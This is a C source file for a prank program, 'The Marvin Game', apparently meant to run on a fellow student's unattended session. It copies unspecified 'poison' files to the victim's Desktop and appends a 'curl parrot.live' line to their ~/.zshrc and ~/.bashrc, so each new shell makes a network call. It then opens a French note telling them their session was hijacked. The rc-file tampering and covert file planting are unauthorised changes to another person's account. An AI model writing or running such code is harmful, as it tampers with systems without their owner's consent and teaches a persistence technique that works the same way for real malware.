#include "../includes/marvin_game.h"

int	print_consignes(t_data *data, char **envp)
{
	int		fd;
	char	*path;
	char	*t_cmd;
	char	**cmd;

	path = ft_strjoin(data->active_dir, "/consignes.txt");
	if (!path)
		return (1);
	fd = open(path, O_RDONLY | O_WRONLY | O_CREAT | O_TRUNC, 0777);
	if (fd < 0)
		return (1);
	dprintf(fd, "----------The Marvin Game----------\n\n");
	dprintf(fd, "Bienvenue dans The Marvin Game ;)\n\n");
	dprintf(fd, "Ta session était sans surveillance, quel dommage !\n\n");
	dprintf(fd, "Pour pouvoir l'utiliser à nouveau tu va devoir jouer à notre petit jeu. Une version de où est Charlie, version 42.\n");
	dprintf(fd, "Comme tu as pu le constater il y a quelques nouveaux fichiers sur ton bureau, seul l'un d'eux est capable de t'aider.\n\n");
	dprintf(fd, "Il ne te reste plus qu'à chercher. Amuse-toi bien ;)\n");
	close(fd);
	printf("Creating consignes.txt\n");
	t_cmd = ft_strjoin("open ", path);
	free(path);
	if (!t_cmd)
		return (1);
	cmd = ft_split(t_cmd, ' ');
	if (!cmd)
		return (free(t_cmd), 1);
	process_child(cmd, envp);
	free(t_cmd);
	free_tab(cmd);
	return (0);
}

int	copy_alias(int file_count, char **envp)
{
	int			i;
	int			fd;
	static char	*command = "curl parrot.live";
	static char	*file_list[] = {"/.zshrc", "/.bashrc", NULL};
	char		*path;

	printf("Start shell rc modifications...\n");
	i = -1;
	while (file_list[++i])
	{
		path = ft_strjoin(getenv("HOME"), file_list[i]);
		if (!path)
			return (1);
		printf("opening and writing in %s\n", path);
		fd = open(path, O_CREAT | O_WRONLY | O_APPEND | O_RDONLY);
		if (fd < 0)
			return (1);
		dprintf(fd, "%s\n", command);
		close(fd);
		free(path);
	}
	printf("--------------------\n");
	return (0);
}

int	copy_poison(int file_count, char *dir, char **envp)
{
	char	***cp_command;
	int		i;

	i = -1;
	printf("Start poison and healer copy...\n");
	cp_command = gen_poison_cmd(file_count, dir);
	if (!cp_command)
		return (1);
	while (++i < file_count)
	{
		process_child(cp_command[i], envp);
	}
	waitpid(-1, NULL, 0);
	free_double_tab(cp_command);
	printf("--------------------\n");
	return (0);
}

int	setup_game(t_data *data, char **envp)
{
	if (copy_poison(data->file_count, data->active_dir, envp))
		return (dprintf(2, "Something went wrong :(\n"), 1);
	#ifndef __APPLE__
		if (copy_alias(data->file_count, envp))
			return (dprintf(2, "Something went wrong :(\n"), 1);
	#else
		printf("Avoiding shell rc corruption :)\n");
	#endif
	print_consignes(data, envp);
	return (0);
}

int	main(int argc, char **argv, char **envp)
{
	t_data	data;
	DIR		*desktop_dir;
	int		t;
	char	home_buffer[PATH_MAX];

	srand(time(NULL));
	bzero(&data, sizeof(t_data));
	desktop_dir = NULL;
	if (parse_args(argc, argv, &data))
		return (1);
	printf("--------------------Start Marvin Game--------------------\n");
	if (!data.active_dir)
	{
		#if __APPLE__
			data.active_dir = strdup("./tmp");
		#else
			data.active_dir = ft_strjoin(realpath(getenv("HOME"), home_buffer), "/Desktop");
		#endif
		printf("No active dir given, using default %s\n", data.active_dir);
	}
	if (!data.active_dir || !(desktop_dir = opendir(data.active_dir)))
		return (data.active_dir && (free(data.active_dir), 1), dprintf(2, "Cannot access active dir\n"), 1);
	free(desktop_dir);
	printf("Params:\nFile count = %d\nActive dir = %s\n--------------------\n", data.file_count, data.active_dir);
	t = setup_game(&data, envp);
	free(data.active_dir);
	printf("---------------------------------------------------------\n");
	return (t);
}